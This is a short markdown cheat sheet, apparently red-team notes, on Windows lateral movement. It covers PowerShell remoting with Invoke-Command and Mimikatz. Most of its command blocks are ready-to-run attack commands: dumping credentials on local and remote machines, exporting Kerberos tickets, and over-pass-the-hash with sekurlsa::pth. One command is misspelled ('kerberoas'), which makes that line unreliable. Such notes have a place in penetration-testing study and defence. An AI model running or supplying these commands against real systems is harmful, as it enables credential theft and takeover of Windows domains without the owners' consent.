# Lateral Movement
---
## Navigation
- **[PowerShell Remoting](#powershell-remoting)**
- **[Mimikatz](#mimikatz)**
---
## PowerShell Remoting
- Enabled by deafult on server 2012 onwards.
- On desktop windows machines you may need to enable it `Enable-PSRemoting` (Require admin privs).
- You get elevated shell on remote system if admin creds are used to authenticate (Default setting).

## One-to-One
### PSSession
- interactive
- Runs in a new process (wsmprovhost)
- Is stateful.
### Useful cmdlets
```powershell
New-PSSession
Enter-PSSession
```
## One-to-many
- Also know as Fan-Out-Remoting
- Non-interactive
- Executes commands parallely
- Runs Commands and scripts on
	- Multiple computers
	- In disconnected sessions (v3)
	- As background jobs and more
### Useful cmdlets
```powershell
Invoke-Command -ComputerName <ComputerName>
Invoke-Command -ComputerName (Get-Content <List-of-servers>)
Invoke-Command -ComputerName -Credential # To pass username/password
```
#### Usage Example
```powershell
#To execute a command remotely 
Invoke-Command -scriptblock {whoami;Get-Process} -ComputerName <value> -Credential <Creds>

#To execute script remotely
Invoke-Command -FilePath C:\Path\Get-PassHashes.ps1 -ComputerName (Get-Content <List-of-servers>)

#Whenever you get an error when executing commands/scripts on remote machine check for Language mode because if it's in constrained mode you won't be able to execute anything but built-in cmdlets
Invoke-Command -scriptblock {$ExecutionContext.SessionState.LanguageMode} -ComputerName <value> -Credential <Creds>
```
---
## Mimikatz
- This script is used to dump credentials,tickets and more.
- Mimikatz with PowerShell is done without dropping `mimikatz.exe` to disk.
- It is useful for passing and relaying hashes,tickets and for many active directory attacks.
- The script needs admin privs for dumping creds from local machine.
### Usage
```powershell
#Powersploit module
#Dump credentials on a local machine (Default)
Invoke-Mimikatz -DumpCreds

#Dump creds on multiple remote machines
Invoke-Mimikatz -DumpCreds -ComputerName @("system1","system2")

#Above commands uses PowerShell cmdlet "Invoke-Command" to do their jobs.
```
### Export all kerberoas tickets to disk.
```powershell
#Powersploit module
Invoke-Mimikatz -command '"kerberoas::list /export"'
```
### "Over pass the hash" generate tokens from hashes.
```powershell
#Powersploit module
Invoke-Mimikatz -command '"sekurlsa::pth /user:administrator /domain <DOMAIN> /ntlm:<NTLM> /run:powershell.exe"'
```
